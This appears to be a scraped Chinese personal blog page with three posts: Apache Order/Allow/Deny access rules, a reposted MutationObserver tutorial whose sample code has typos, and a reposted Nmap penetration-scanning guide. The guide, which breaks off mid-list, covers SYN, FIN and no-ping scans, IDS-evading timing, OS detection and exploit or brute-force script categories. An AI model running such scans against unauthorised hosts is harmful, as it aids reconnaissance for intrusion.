      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/apache-order-allow/index.html" itemprop="url">
                  Apache Order Allow
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-08-11 18:02:02" itemprop="dateCreated datePublished" datetime="2017-08-11T18:02:02+08:00">2017-08-11</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。      所以，最常用的是： Order Deny,Allow Allow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。这个主要是用来确保或者覆盖上级目录的设置，开放所有内容的访问权。 按照上面的解释，下面的设定是无条件禁止访问： Order Allow,Deny Deny from All 如果要禁止部分内容的访问，其他的全部开放： Order Deny,Allow Deny from ip1 ip2 或者 Order Allow,Deny Allow from all Deny from ip1 ip2 apache会按照order决定最后使用哪一条规则，比如上面的第二种方式，虽然第二句allow允许了访问，但由于在order中allow不是最后规则，因此还需要看有没有deny规则，于是到了第三句，符合ip1和ip2的访问就被禁止了。注意，order决定的“最后”规则非常重要，下面是两个错误的例子和改正方式： Order Deny,Allow Allow from all Deny from domain.org 错误：想禁止来自domain.org的访问，但是deny不是最后规则，apache在处理到第二句allow的时候就已经匹配成功，根本就不会去看第三句。 解决方法：Order Allow,Deny，后面两句不动，即可。 Order Allow,Deny Allow from ip1 Deny from all 错误：想只允许来自ip1的访问，但是，虽然第二句中设定了allow规则，由于order中deny在后，所以会以第三句deny为准，而第三句的范围中又明显包含了ip1（all include ip1），所以所有的访问都被禁止了。 解决方法一：直接去掉第三句。 解决方法二： Order Deny,Allow Deny from all Allow from ip1 下面是测试过的例子： ——————————– Order deny,allow allow from all deny from 219.204.253.8 #全部都可以通行 ——————————- Order deny,allow deny from 219.204.253.8 allow from all #全部都可以通行 ——————————- Order allow,deny deny from 219.204.253.8 allow from all #只有219.204.253.8不能通行 ——————————- Order allow,deny allow from all deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- ——————————- Order allow,deny deny from all allow from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 deny from all #全部都不能通行 ——————————- Order deny,allow allow from 219.204.253.8 deny from all #只允许219.204.253.8通行 ——————————- Order deny,allow deny from all allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- ——————————– Order deny,allow #全部都可以通行（默认的） ——————————- Order allow,deny #全部都不能通行（默认的） ——————————- Order allow,deny deny from all #全部都不能通行 ——————————- Order deny,allow deny from all #全部都不能通行 ——————————- 对于上面两种情况，如果换成allow from all，则全部都可以通行！ ——————————- Order deny,allow deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- Order allow,deny deny from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- Order deny,allow allow from 219.204.253.8 #全部都可以通行 ——————————- ——————————- order deny,allow allow from 218.20.253.2 deny from 218.20 #代表拒绝218.20开头的IP，但允许218.20.253.2通过；而其它非218.20开头的IP也都允许通过。 ——————————- order allow,deny allow from 218.20.253.2 deny from 218.20 #和上面的差不多，只是掉换的order语句中的allow、deny先后顺序，但最终结果表示全部都拒绝！      form:<a href="http://hi.baidu.com/enjoypain/blog/item/f48c7aecdba298d12f2e21ac.html">http://hi.baidu.com/enjoypain/blog/item/f48c7aecdba298d12f2e21ac.html</a>      前段时间做了个Apache的HTTP代理服务器，其中的order allow，deny这部分弄的不太懂，于是上网找资料看，谁知道越看越糊涂，其中有些难以分辨对错甚至是误导。就像破解windows系统密码的一些文章那样，很多都是人云亦云的，并没有经过测试。废话少说，先把我经过测试后分析总结出来的结论show出来，相信这对大家的理解非常有帮助。 总则—— 影响最终判断结果的只有两点： 1. order语句中allow、deny的先后顺序； 2. allow、deny语句中各自包含的范围。 温馨提醒—— 1. 修改完配置后要保存好并重启Apache服务，配置才能生效； 2. 开头字母不分大小写； 3. allow、deny语句不分先后顺序，谁先谁后不影响最终判断结果；但都会被判断到； 4. order语句中，“allow,deny”之间“有且只有”一个逗号（英文格式的），而且先后顺序很重要； 5. Apache有一条缺省规则，“order allow,deny”本身就默认了拒绝所有的意思，因为deny在allow的后面；同理，“order deny,allow”本身默认的是允许所有；当然，最终判断结果还要综合下面的allow、deny语句中各自所包含的范围；（也就是说order语句后面可以没有allow、deny语句） 6. allow、deny语句中，第二个单词一定是“from”，否则Apache会因错而无法启动， 7. “order allow,deny”代表先判断allow语句再判断deny语句，反之亦然。 上面说的都是要记住的，而下面说的是我独创的理解方法。如果有人看了而没有豁然开朗的感觉，那算是我的失败！ 判断原则分4步走—— 1. 首先判断默认的； 2. 然后判断逗号前的； 3. 最后判断逗号后的； 4. 最终按顺序叠加而得出判断结果。 上面三点我说的简单而形象，主要是为了便于记忆。暂时不理解不要紧，继续看下面详细的解说自然会明白。下面以一个普通例子来做解释—— order deny,allow allow from 218.20.253.2 deny from 218.20 1. 所谓“首先判断默认的”，就是判断“order deny,allow”这句，它默认是允许所有； 2. 所谓“然后判断逗号前的”，因为在本例子中的order语句里面，deny在逗号的前面，所以现在轮到判断下面的deny语句了——“deny from 218.20”； 3. 所谓“最后判断逗号后的”，因为在本例子中的order语句里面，allow在逗号的后面，所以最后轮到判断下面的allow语句了——“allow from 218.20.253.2”。 4. 所谓“最终按顺序叠加而得出判断结果”，这是一个形象化了的说法，我把每一步判断都看作一个“不透明的图层”，然后一步步按顺序叠加上去，最终得出的“图像”就是判断结果。 用过作图软件的人应该都知道“图层”是怎么回事，我估计Apache关于order allow deny这方面的设计理念和photoshop等作图软件关于图层的设计理念是一样的。即“游戏规则”是一样的。 那么上面的例子就可以是这么一个步骤和图像—— 1. 先画一个白色的大圆，代表“order deny,allow”语句，默认意思是允许所有； 2. 然后画一个小一点的黑色圆，代表“deny from 218.20”语句，意思是拒绝所有以218.20开头的IP，放进白色的大圆里面； 3. 最后再画一个白色的圆，代表“allow from 218.20.253.2”语句，意思是允许218.20.253.2通过，放在黑色圆的上面。 4. 到此为止，我们已经可以看到一个结果了，白色大圆上面有一个黑色圆，黑色圆上面还有一个白色圆。最后，我们所能看到的黑色部分就是拒绝通行的，剩下的白色部分都是允许通行的。判断的结果就是这么简单形象！ 如果不懂的用作图软件，我们再来个非常贴近生活的比喻—— 把上面的例子改动一点点，以便更好的理解： order deny,allow allow from 218.20.253.2 deny from 219.30 1. 首先拿一张A4白纸，代表第order语句，意思是允许全部； 2. 然后拿一张黑色纸剪一个圆，放在A4纸里面的某个位置上，代表deny语句，意思是拒绝所有以219.30开头的IP； 3. 最后拿白纸再剪一个圆，放在黑色圆的旁边，代表allow语句，意思是允许218.20.253.2通过；注意，这个例子不是放进黑色圆里面了，因为deny和allow语句不再有相互包含的关系了。 4. A4纸上面有一个黑色圆和一个白色圆，结果自然很明显了。不过白色的A4纸上再放一个白色的圆，显然是多余的了，因为大家都是白色的，都代表允许，所以就重复了，可以去掉白色的圆而不会影响判断结果。 如果看到这里还没明白，那一定是我还有什么没说清楚的。那么请好好分析我所做过的测试例子，将在最后列出来。 在这里再啰嗦一下，allow、deny语句后面跟的参数有多种形式，有不同的表达方式，我在网上看到的做法是deny from IP1 IP2 IP3或allow from domain.com等。其它的表达方式大家再找别的资料看吧。我想说的是另一种表达方式： order deny,allow allow from IP1 IP2 allow from domain.info allow from 219.20.55.0/24 deny from all 我没具体验证过这是否对，不过这样是可以正常启动Apache服务的，按道理应该是正确的表达方式。哈哈，像我这样的入门者只能这样了，还希望大家多多指教！ 下面是测试过的例子： ——————————– Order deny,allow allow from all deny from 219.204.253.8 #全部都可以通行 ——————————- Order deny,allow deny from 219.204.253.8 allow from all #全部都可以通行 ——————————- Order allow,deny deny from 219.204.253.8 allow from all #只有219.204.253.8不能通行 ——————————- Order allow,deny allow from all deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- ——————————- Order allow,deny deny from all allow from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 deny from all #全部都不能通行 ——————————- Order deny,allow allow from 219.204.253.8 deny from all #只允许219.204.253.8通行 ——————————- Order deny,allow deny from all allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- ——————————– Order deny,allow #全部都可以通行（默认的） ——————————- Order allow,deny #全部都不能通行（默认的） ——————————- Order allow,deny deny from all #全部都不能通行 ——————————- Order deny,allow deny from all #全部都不能通行 ——————————- 对于上面两种情况，如果换成allow from all，则全部都可以通行！ ——————————- Order deny,allow deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- Order allow,deny deny from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- Order deny,allow allow from 219.204.253.8 #全部都可以通行 ——————————- ——————————- order deny,allow allow from 218.20.253.2 deny from 218.20 #代表拒绝218.20开头的IP，但允许218.20.253.2通过；而其它非218.20开头的IP也都允许通过。 ——————————- order allow,deny allow from 218.20.253.2 deny from 218.20 #和上面的差不多，只是掉换的order语句中的allow、deny先后顺序，但最终结果表示全部都拒绝！   </p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/html5-mutation-observer-2/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/html5-mutation-observer-2/index.html" itemprop="url">
                  html5新特性: MutationObeserver
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-08-11 00:43:56" itemprop="dateCreated datePublished" datetime="2017-08-11T00:43:56+08:00">2017-08-11</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>帮一哥们儿搞node-red的前端，需要实时获取node-red数据并在canvas上做相应的绘图工作，几番百度之后百度到了Mutation-Observer这样一个神奇的新特性。因此引用一下别的表哥写的关于MutationObserver的使用说明作为以后的参考。转自：<a href="http://www.cnblogs.com/jscode/p/3600060.html">http://www.cnblogs.com/jscode/p/3600060.html</a></p>
<h1 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h1><p>Mutation Observer（变动观察器）是监视DOM变动的接口。当DOM对象树发生任何变动时，Mutation Observer会得到通知。 要概念上，它很接近事件。可以理解为，当DOM发生变动会触发Mutation Observer事件。但是，它与事件有一个本质不同：事件是同步触发，也就是说DOM发生变动立刻会触发相应的事件；Mutation Observer则是异步触发，DOM发生变动以后，并不会马上触发，而是要等到当前所有DOM操作都结束后才触发。 这样设计是为了应付DOM变动频繁的情况。举例来说，如果在文档中连续插入1000个段落（p元素），会连续触发1000个插入事件，执行每个事件的回调函数，这很可能造成浏览器的卡顿；而Mutation Observer完全不同，只在1000个段落都插入结束后才会触发，而且只触发一次。 Mutation Observer有以下特点：</p>
<ul>
<li>它等待所有脚本任务完成后，才会运行，即采用异步方式</li>
<li>它把DOM变动记录封装成一个数组进行处理，而不是一条条地个别处理DOM变动。</li>
<li>它即可以观察发生在DOM节点的所有变动，也可以观察某一类变动</li>
</ul>
<p>目前，Firefox(14+)、Chrome(26+)、Opera(15+)、IE(11+)和Safari(6.1+)支持这个API。Safari 6.0和Chrome 18-25使用这个API的时候，需要加上WebKit前缀（WebKitMutationObserver）。可以使用下面的表达式检查浏览器是否支持这个API。</p>
<p>var MutationObserver = window.MutationObserver ||<br>    window.WebKitMutationObserver ||<br>    window.MozMutationObserver;</p>
<p>var mutationObserverSupport = !!MutationObserver;</p>
<h1 id="2、使用方法"><a href="#2、使用方法" class="headerlink" title="2、使用方法"></a>2、使用方法</h1><p>首先，使用MutationObserver构造函数，新建一个实例，同时指定这个实例的回调函数。</p>
<p>var observer = new MutationObserver(callback);</p>
<h2 id="2-1-observer方法"><a href="#2-1-observer方法" class="headerlink" title="2.1 observer方法"></a>2.1 observer方法</h2><p>observer方法指定所要观察的DOM元素，以及要观察的特定变动。</p>
<p>var article = document.querySelector(‘article’);</p>
<p>var options = {<br>    ‘childList’: true,<br>    ‘arrtibutes’: true<br>};</p>
<p>observer.observer(article, options);</p>
<p>上面代码首先指定，所要观察的DOM元素提article，然后指定所要观察的变动是子元素的变动和属性变动。最后，将这两个限定条件作为参数，传入observer对象的observer方法。 MutationObserver所观察的DOM变动（即上面代码的option对象），包含以下类型：</p>
<ul>
<li>childList：子元素的变动</li>
<li>attributes：属性的变动</li>
<li>characterData：节点内容或节点文本的变动</li>
<li>subtree：所有下属节点（包括子节点和子节点的子节点）的变动</li>
</ul>
<p>想要观察哪一种变动类型，就在option对象中指定它的值为true。需要注意的是，不能单独观察subtree变动，必须同时指定childList、attributes和characterData中的一种或多种。 除了变动类型，option对象还可以设定以下属性：</p>
<ul>
<li>attributeOldValue：值为true或者为false。如果为true，则表示需要记录变动前的属性值。</li>
<li>characterDataOldValue：值为true或者为false。如果为true，则表示需要记录变动前的数据值。</li>
<li>attributesFilter：值为一个数组，表示需要观察的特定属性（比如[‘class’, ‘str’]）。</li>
</ul>
<h2 id="2-2-disconnect方法和takeRecord方法"><a href="#2-2-disconnect方法和takeRecord方法" class="headerlink" title="2.2 disconnect方法和takeRecord方法"></a>2.2 disconnect方法和takeRecord方法</h2><p>disconnect方法用来停止观察。发生相应变动时，不再调用回调函数。</p>
<p>observer.disconnect();</p>
<p>takeRecord方法用来清除变动记录，即不再处理未处理的变动。</p>
<p>observer.takeRecord</p>
<h2 id="2-3-MutationRecord对象"><a href="#2-3-MutationRecord对象" class="headerlink" title="2.3 MutationRecord对象"></a>2.3 MutationRecord对象</h2><p>DOM对象每次发生变化，就会生成一条变动记录。这个变动记录对应一个MutationRecord对象，该对象包含了与变动相关的所有信息。Mutation Observer进行处理的一个个变动对象所组成的数组。 MutationRecord对象包含了DOM的相关信息，有如下属性：</p>
<ul>
<li>type:观察的变动类型（attribute、characterData或者childList）。</li>
<li>target:发生变动的DOM对象。</li>
<li>addedNodes:新增的DOM对象。</li>
<li>removeNodes:删除的DOM对象。</li>
<li>previousSibling:前一个同级的DOM对象，如果没有则返回null。</li>
<li>nextSibling:下一个同级的DOM对象，如果没有就返回null。</li>
<li>attributeName:发生变动的属性。如果设置了attributeFilter，则只返回预先指定的属性。</li>
<li>oldValue:变动前的值。这个属性只对attribute和characterData变动有效，如果发生childList变动，则返回null。</li>
</ul>
<h1 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h1><h2 id="3-1-子元素的变动"><a href="#3-1-子元素的变动" class="headerlink" title="3.1 子元素的变动"></a>3.1 子元素的变动</h2><p>下面的例子说明如果读取变动记录。</p>
<p>var callback = function(records) {<br>    records.map(function(record) {<br>        console.log(‘Mutation type: ‘ + record.type);<br>        console.log(‘Mutation target: ‘ + record.target);<br>    });<br>};</p>
<p>var mo = new MutationObserver(callback);</p>
<p>var option = {<br>    ‘childList’: true,<br>    ‘subtree’: true<br>};</p>
<p>mo.observer(document.body, option);</p>
<p>上面代码的观察器，观察body元素的所有下级元素（childList表示观察子元素，subtree表示观察子元素的下级元素）的变动。回调函数会在控制台显示所有变动的类型和目标元素。</p>
<h2 id="3-2、属性的变动"><a href="#3-2、属性的变动" class="headerlink" title="3.2、属性的变动"></a>3.2、属性的变动</h2><p>下面的例子说明如何追踪属性的变动。</p>
<p>var callback = function(records) {<br>    records.map(function(record) {<br>        console.log(‘Previous attribute value: ‘ + record.oldValue);<br>    });<br>};</p>
<p>var mo = new MutationObserver(callback);</p>
<p>var element = document.getElementById(‘#my_element’);</p>
<p>var option = {<br>    ‘attribute’: true,<br>    ‘attributeOldValue’: true<br>};</p>
<p>mo.observer(element, option);</p>
<p>上面代码先设定追踪属性变动（’attributes’: true），然后设定记录变动前的值。实际发生变动时，会将变动前的值显示在控制台。</p>
<h1 id="4、参考链接"><a href="#4、参考链接" class="headerlink" title="4、参考链接"></a>4、参考链接</h1><p>[1] Tiffany Brown, <a href="http://dev.opera.com/articles/view/mutation-observers-tutorial/">Getting to know mutation observers</a> [2] Michal Budzynski, <a href="http://michalbe.blogspot.com/2013/04/javascript-less-known-parts-dom.html">JavaScript: The less know parts.DOM Mutations</a> [3] Jeff Griffiths, <a href="https://hacks.mozilla.org/2012/05/dom-mutationobserver-reacting-to-dom-changes-without-killing-browser-performance/">DOM MutationObserver - reacting to DOM changes without killing browser performance</a> [4] Ruanyf, <a href="http://javascript.ruanyifeng.com/dom/mutationobserver.html">Mutation Observer</a></p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/nmapguide/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/nmapguide/index.html" itemprop="url">
                  不老的神器：安全扫描器Nmap渗透使用指南
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-07-29 13:15:48" itemprop="dateCreated datePublished" datetime="2017-07-29T13:15:48+08:00">2017-07-29</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>*本文原创作者：国光，属于FreeBuf原创奖励计划，转载请注明FreeBuf.COM 介绍 nmap是用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图Nmap的发送特制的数据包到目标主机然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。 特点 主机探测 端口扫描 版本检测 支持探测脚本的编写 安装 官网:<a href="http://nmap.org">http://nmap.org</a> 图形化:Zenmap 基本操作 基本快速扫描 Nmap 默认发送一个arp的ping数据包来探测目标主机在1-10000范围内所开放的端口。 nmap 10.130.1.43 一款强大的安全扫描器nmap：不老的神器 快速扫描多个目标 nmap nmap 10.130.1.28 10.130.1.43 一款强大的安全扫描器nmap：不老的神器 详细描述输出扫描 简单扫描并对返回的结果详细描述输出,这个扫描是可以看到扫描的过程的,漫长的扫描的过程中可以看到百分比 就不会显得那么枯燥而且可以提升逼格。 nmap -vv 10.1.1.254 一款强大的安全扫描器nmap：不老的神器 亲测,-v和-vv扫描几乎是一样都都是列出了详细的扫描过程。 指定端口和范围扫描 nmap 默认扫描目标1-10000范围内的端口号。我们则可以通过参数-p 来设置我们将要扫描的端口号 nmap -p(range) namp -p3389,20-100 10.130.1.43 一款强大的安全扫描器nmap：不老的神器 扫描除过某一个ip外的所有子网主机 nmap 10.130.1.1/24 -exclude 10.130.1.1 扫描除过某一个文件中的ip外的子网主机 nmap 10.130.1.1/24 -excludefile gov.txt 显示扫描的所有主机的列表 nmap -sL 10.130.1.1/24 sP ping 扫描 nmap 可以利用类似window/linux 系统下的ping方式进行扫描 nmap -sP 一般来说 我们会用这个命令去扫描内网的一个ip范围用来做内网的主机发现。 nmap -sP 10.130.1.1-255 一款强大的安全扫描器nmap：不老的神器 PING扫描不同于其它的扫描方式因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限如果用户没有ROOT权限,PING扫描将会使用connect()调用. sS SYN半开放扫描 nmap -sS 192.168.1.1 Tcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描因为这种技术使得Nmap不需要通过完整的握手就能获得远程主机的信息。Nmap发送SYN包到远程主机但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限。 sT TCP扫描 nmap -sT 192.168.1.1 不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口。 sU UDP扫描 nmap -sU 192.168.1.1 这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机并等待响应,如果返回ICMP不可达的错误消息说明端口是关闭的如果得到正确的适当的回应说明端口是开放的. sF FIN标志的数据包扫描 nmap -sF 110.130.1.43 一款强大的安全扫描器nmap：不老的神器 可以看出这个扫描的话 会漏扫许多~FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包. sV Version版本检测扫描 nmap -sV 192.168.1.135 本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术它不是用来扫描目标主机上开放的端口不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCPSYN扫描开放了哪些端口。 一款强大的安全扫描器nmap：不老的神器 这个扫描的话速度会慢一些67.86秒扫一个IP。 O OS操作系统类型的探测 nmap -O 10.130.1.43 远程检测操作系统和软件Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库该数据库包含超过2600操作系统的信息。Nmap把TCP和UDP数据包发送到目标机器上然后检查结果和数据库对照。 一款强大的安全扫描器nmap：不老的神器 osscan-guess 猜测匹配操作系统 nmap -O –osscan-guess 192.168.1.134 通过Nmap准确的检测到远程操作系统是比较困难的需要使用到Nmap的猜测功能选项,–osscan-guess猜测认为最接近目标的匹配操作系统类型。 一款强大的安全扫描器nmap：不老的神器 PN No ping扫描 nmap -O -PN 192.168.1.1/24 如果远程主机有防火墙IDS和IPS系统你可以使用-PN命令来确保不ping远程主机因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现。 一款强大的安全扫描器nmap：不老的神器 这个扫描整个c段局域网的话还是比较耗时的但是信息收集很详细大概耗时9分钟。 T 设置时间模板 nmap -sS -T<0-5> 192.168.1.134 优化时间控制选项的功能很强大也很有效但有些用户会被迷惑。此外 往往选择合适参数的时间超过了所需优化的扫描时间。因此Nmap提供了一些简单的 方法使用6个时间模板使用时采用-T选项及数字(0 – 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) paranoid、sneaky模式用于IDS躲避 Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。 Normal为默认模式因此-T3 实际上是未做任何优化。 Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描. nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 网段扫描格式 nmap -sP 解释CIDR 为你设置的子网掩码(/24 , /16 ,/8 等) 10.1.1.0/24 = 10.1.1.1-10.1.1.255 #c段扫描 10.1.1.0/16 = 10.1.1.1-10.1.255.255 #b段扫描 10.1.1.0/8 = 10.1.1.1-10.255.255.255 #a段扫描 从文件中读取需要扫描的IP列表 nmap -iL ip-address.txt 一款强大的安全扫描器nmap：不老的神器 路由跟踪扫描 路由器追踪功能能够帮网络管理员了解网络通行情况同时也是网络管理人员很好的辅助工具通过路由器追踪可以轻松的查处从我们电脑所在地到目标地之间所经常的网络节点并可以看到通过各个节点所花费的时间 nmap -traceroute <a href="http://www.baidu.com">www.baidu.com</a> 一款强大的安全扫描器nmap：不老的神器 A OS识别,版本探测,脚本扫描和traceroute综合扫描 此选项设置包含了1-10000的端口ping扫描操作系统扫描脚本扫描路由跟踪服务探测。 nmap -A 10.130.1.43 一款强大的安全扫描器nmap：不老的神器一款强大的安全扫描器nmap：不老的神器 命令混合式扫描 命令混合扫描可以做到类似参数-A所完成的功能但又能细化到我们所需特殊要求。所以一般高手选择这个混合扫描 nmap -vv -p1-100,3306,3389 -O -traceroute 10.130.1.43 这些参数都是可以灵活调用的具体根据具体的扫描来使用各个参数。 一款强大的安全扫描器nmap：不老的神器一款强大的安全扫描器nmap：不老的神器 nmap -p1-65535 -sV -sS -T4 10.130.1.134 使SYN扫描并进行Version版本检测 使用T4(aggressive)的时间模板对目标ip的全端口进行扫描。 输出格式 扫描的结果输出到屏幕,同时会存储一份到grep-output.txt nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24 扫描结果输出为html nmap -sS -sV -T5 10.0.1.99 –webxml -oX - | xsltproc –output file.html nmap高级用法之脚本使用 按照脚本分类进行扫描 nmap –script 类别 nmap官方脚本文档: <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a> 一款强大的安全扫描器nmap：不老的神器 左侧列出了脚本的分类点击分类 可以看到每一个分类下有很多具体的脚本供我们使用。nmap –script=类别这里的类别可以填写下面14大分类中的其中之一也可以填写分类里面的具体漏洞扫描脚本。nmap脚本分类: - auth: 负责处理鉴权证书绕开鉴权的脚本 - broadcast: 在局域网内探查更多服务开启状况如dhcp/dns/sqlserver等服务 - brute: 提供暴力破解方式针对常见的应用如http/snmp等 - default: 使用-sC或-A选项扫描时候默认的脚本提供基本脚本扫描能力 - discovery: 对网络进行更多的信息如SMB枚举、SNMP查询等 - dos: 用于进行拒绝服务攻击 - exploit: 利用已知的漏洞入侵系统 - external: 利用第三方的数据库或资源例如进行whois解析 - fuzzer: 模糊测试的脚本发送异常的包到目标机探测出潜在漏洞 - intrusive: 入侵性的脚本此类脚本可能引发对方的IDS/IPS的记录或屏蔽 - malware: 探测目标机是否感染了病毒、开启了后门等信息 - safe: 此类与intrusive相反属于安全性脚本 - version: 